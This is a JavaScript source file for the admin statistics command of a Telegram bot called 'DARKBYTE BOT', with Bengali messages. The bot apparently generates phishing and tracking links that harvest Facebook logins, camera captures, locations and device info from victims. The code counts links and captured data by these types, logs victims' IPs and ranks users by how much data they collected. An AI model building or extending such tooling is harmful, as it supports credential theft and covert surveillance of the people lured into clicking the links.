const adminCheck = require('../middlewares/adminCheck');
const User = require('../models/User');
const Link = require('../models/Link');
const Data = require('../models/Data');
const Log = require('../models/Log');
const helpers = require('../utils/helpers');

class StatsCommand {
  async execute(bot, msg) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
      const isAdmin = await adminCheck(userId);
      if (!isAdmin) {
        return bot.sendMessage(chatId, '⛔ আপনি অ্যাডমিন নন।');
      }
      
      // সব স্ট্যাটস সমান্তরালে ফেচ
      const [
        userStats,
        linkStats,
        visitStats,
        dataStats,
        realtimeStats,
        topUsers
      ] = await Promise.all([
        this.getUserStats(),
        this.getLinkStats(),
        this.getVisitStats(),
        this.getDataStats(),
        this.getRealtimeStats(),
        this.getTopUsers(5)
      ]);
      
      const message = this.buildStatsMessage({
        userStats,
        linkStats,
        visitStats,
        dataStats,
        realtimeStats,
        topUsers
      });
      
      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
      
    } catch (error) {
      console.error('Stats Command Error:', error);
      await bot.sendMessage(chatId, '❌ স্ট্যাটস দেখাতে সমস্যা হয়েছে।');
    }
  }
  
  async getUserStats() {
    const total = await User.countDocuments();
    const approved = await User.countDocuments({ approved: true, banned: false });
    const pending = await User.countDocuments({ approved: false, banned: false });
    const banned = await User.countDocuments({ banned: true });
    const admins = await User.countDocuments({ isAdmin: true });
    
    const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    const weekly = await User.countDocuments({ joinedAt: { $gte: weekAgo } });
    
    const monthAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
    const monthly = await User.countDocuments({ joinedAt: { $gte: monthAgo } });
    
    return {
      total,
      approved,
      pending,
      banned,
      admins,
      weekly,
      monthly,
      approvedPercent: total ? ((approved / total) * 100).toFixed(1) : 0,
      pendingPercent: total ? ((pending / total) * 100).toFixed(1) : 0,
      bannedPercent: total ? ((banned / total) * 100).toFixed(1) : 0
    };
  }
  
  async getLinkStats() {
    const total = await Link.countDocuments();
    
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayLinks = await Link.countDocuments({ createdAt: { $gte: today } });
    
    const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    const weeklyLinks = await Link.countDocuments({ createdAt: { $gte: weekAgo } });
    
    // টাইপ অনুযায়ী লিংক
    const types = ['fb', 'camera', 'location', 'info', 'all', 'custom'];
    const byType = {};
    
    for (const type of types) {
      byType[type] = await Link.countDocuments({ type });
    }
    
    return {
      total,
      today: todayLinks,
      weekly: weeklyLinks,
      byType
    };
  }
  
  async getVisitStats() {
    const links = await Link.find();
    
    const totalVisits = links.reduce((sum, link) => sum + link.visits, 0);
    const uniqueVisitors = links.reduce((sum, link) => sum + link.uniqueVisits, 0);
    
    const totalData = await Data.countDocuments();
    const bounceRate = totalVisits > 0 
      ? ((totalVisits - totalData) / totalVisits * 100).toFixed(1)
      : 0;
    
    return {
      totalVisits,
      uniqueVisitors,
      bounceRate,
      averageVisitsPerLink: links.length ? (totalVisits / links.length).toFixed(1) : 0
    };
  }
  
  async getDataStats() {
    const total = await Data.countDocuments();
    
    // টাইপ অনুযায়ী ডাটা
    const types = ['fb', 'camera', 'location', 'info'];
    const byType = {};
    
    for (const type of types) {
      byType[type] = await Data.countDocuments({ type });
    }
    
    // পার্সেন্টেজ
    const percentages = {};
    for (const type of types) {
      percentages[type] = total ? ((byType[type] / total) * 100).toFixed(1) : 0;
    }
    
    return {
      total,
      byType,
      percentages
    };
  }
  
  async getTopUsers(limit = 5) {
    const topUsers = await Link.aggregate([
      {
        $group: {
          _id: '$userId',
          linkCount: { $sum: 1 },
          visitCount: { $sum: '$visits' },
          dataCount: { $sum: '$data' }
        }
      },
      { $sort: { linkCount: -1 } },
      { $limit: limit }
    ]);
    
    // ইউজার ডিটেইলস যোগ
    for (const user of topUsers) {
      const userInfo = await User.findOne({ userId: user._id });
      user.username = userInfo?.username || 'Unknown';
      user.firstName = userInfo?.firstName || 'Unknown';
    }
    
    return topUsers;
  }
  
  async getRealtimeStats() {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
    
    const activeVisitors = await Link.aggregate([
      { $unwind: '$visitors' },
      { $match: { 'visitors.timestamp': { $gte: fiveMinAgo } } },
      { $group: { _id: '$visitors.ip' } },
      { $count: 'total' }
    ]);
    
    const visitsPerMinute = await Data.countDocuments({
      timestamp: { $gte: new Date(Date.now() - 60 * 1000) }
    });
    
    // লাস্ট ২৪ ঘন্টার লগ
    const dayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
    const logs24h = await Log.countDocuments({ timestamp: { $gte: dayAgo } });
    
    return {
      activeVisitors: activeVisitors[0]?.total || 0,
      visitsPerMinute,
      logs24h,
      uptime: process.uptime(),
      memory: process.memoryUsage().heapUsed / 1024 / 1024
    };
  }
  
  buildStatsMessage(stats) {
    const { userStats, linkStats, visitStats, dataStats, realtimeStats, topUsers } = stats;
    
    let message = `📊 **𝐃𝐀𝐑𝐊𝐁𝐘𝐓𝐄 𝐁𝐎𝐓 𝐀𝐍𝐀𝐋𝐘𝐓𝐈𝐂𝐒**\n\n`;
    
    // ইউজার স্ট্যাটস
    message += `👥 **ইউজার স্ট্যাটস**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `📌 টোটাল ইউজার: ${helpers.formatNumber(userStats.total)}\n`;
    message += `📈 এই সপ্তাহে: ${helpers.formatNumber(userStats.weekly)}\n`;
    message += `📊 গত মাসে: ${helpers.formatNumber(userStats.monthly)}\n\n`;
    message += `✅ অ্যাপ্রুভড: ${userStats.approved} (${userStats.approvedPercent}%)\n`;
    message += `⏳ পেন্ডিং: ${userStats.pending} (${userStats.pendingPercent}%)\n`;
    message += `❌ ব্যানড: ${userStats.banned} (${userStats.bannedPercent}%)\n`;
    message += `👑 অ্যাডমিন: ${userStats.admins}\n\n`;
    
    // লিংক স্ট্যাটস
    message += `🔗 **লিঙ্ক স্ট্যাটস**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `📌 টোটাল লিঙ্ক: ${helpers.formatNumber(linkStats.total)}\n`;
    message += `📈 আজকে: ${helpers.formatNumber(linkStats.today)}\n`;
    message += `📊 এই সপ্তাহে: ${helpers.formatNumber(linkStats.weekly)}\n`;
    message += `📸 ফেসবুক: ${linkStats.byType.fb}\n`;
    message += `📷 ক্যামেরা: ${linkStats.byType.camera}\n`;
    message += `📍 লোকেশন: ${linkStats.byType.location}\n`;
    message += `📱 ইনফো: ${linkStats.byType.info}\n`;
    message += `⚡ অল-ইন-ওয়ান: ${linkStats.byType.all}\n`;
    message += `🎯 কাস্টম: ${linkStats.byType.custom}\n\n`;
    
    // ভিজিট স্ট্যাটস
    message += `👁️ **ভিজিট স্ট্যাটস**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `📌 টোটাল ভিজিট: ${helpers.formatNumber(visitStats.totalVisits)}\n`;
    message += `📈 ইউনিক ভিজিটর: ${helpers.formatNumber(visitStats.uniqueVisitors)}\n`;
    message += `📊 বাউন্স রেট: ${visitStats.bounceRate}%\n`;
    message += `📊 গড় ভিজিট/লিঙ্ক: ${visitStats.averageVisitsPerLink}\n\n`;
    
    // ডাটা স্ট্যাটস
    message += `📦 **ডাটা স্ট্যাটস**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `📌 টোটাল ডাটা: ${helpers.formatNumber(dataStats.total)}\n`;
    message += `📸 ফেসবুক: ${dataStats.byType.fb} (${dataStats.percentages.fb}%)\n`;
    message += `📍 লোকেশন: ${dataStats.byType.location} (${dataStats.percentages.location}%)\n`;
    message += `📱 ইনফো: ${dataStats.byType.info} (${dataStats.percentages.info}%)\n`;
    message += `📷 ক্যামেরা: ${dataStats.byType.camera} (${dataStats.percentages.camera}%)\n\n`;
    
    // টপ ইউজার
    message += `🏆 **টপ ইউজার**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    topUsers.forEach((user, index) => {
      const medal = index === 0 ? '🥇' : index === 1 ? '🥈' : '🥉';
      message += `${medal} @${user.username} - ${user.linkCount} লিঙ্ক, ${user.dataCount} ডাটা\n`;
    });
    message += `\n`;
    
    // রিয়েল-টাইম
    message += `⚡ **রিয়েল-টাইম**\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `👁️ একটিভ ভিজিটর: ${realtimeStats.activeVisitors}\n`;
    message += `📊 ভিজিট/মিনিট: ${realtimeStats.visitsPerMinute}\n`;
    message += `📋 লগ (২৪ঘ): ${realtimeStats.logs24h}\n`;
    message += `⏱️ আপটাইম: ${Math.floor(realtimeStats.uptime / 3600)}ঘ ${Math.floor((realtimeStats.uptime % 3600) / 60)}ম\n`;
    message += `💾 মেমরি: ${realtimeStats.memory.toFixed(1)} MB\n\n`;
    
    message += `📥 এক্সপোর্ট: /stats export\n`;
    message += `🔄 রিফ্রেশ: /stats`;
    
    return message;
  }
  
  async export(bot, msg) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
      const isAdmin = await adminCheck(userId);
      if (!isAdmin) return;
      
      const stats = {
        users: await this.getUserStats(),
        links: await this.getLinkStats(),
        visits: await this.getVisitStats(),
        data: await this.getDataStats(),
        timestamp: new Date().toISOString()
      };
      
      const jsonData = JSON.stringify(stats, null, 2);
      const buffer = Buffer.from(jsonData, 'utf-8');
      
      await bot.sendDocument(chatId, buffer, {
        filename: `stats_${Date.now()}.json`,
        caption: '📊 সম্পূর্ণ স্ট্যাটস এক্সপোর্ট'
      });
      
    } catch (error) {
      console.error('Stats Export Error:', error);
      await bot.sendMessage(chatId, '❌ এক্সপোর্ট করতে সমস্যা হয়েছে।');
    }
  }
}

module.exports = new StatsCommand();